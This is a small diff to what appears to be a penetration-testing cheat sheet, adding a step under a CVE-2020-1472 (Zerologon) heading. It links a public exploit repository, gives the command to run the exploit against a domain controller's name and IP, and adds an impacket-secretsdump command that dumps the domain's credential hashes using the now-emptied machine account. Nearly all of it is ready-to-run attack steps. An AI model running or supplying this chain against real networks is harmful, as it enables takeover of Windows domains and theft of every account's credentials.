@@ -201,5 +201,6 @@ CVE-2020-1472 : Zero Logon
 ```markdown
 https://github.com/dirkjanm/CVE-2020-1472
 python3 cve-2020-1472-exploit.py NETBIOS_DC_NAME IP
+impacket-secretsdump './NETBIOS_DC_NAME$@IP'
 ```
 
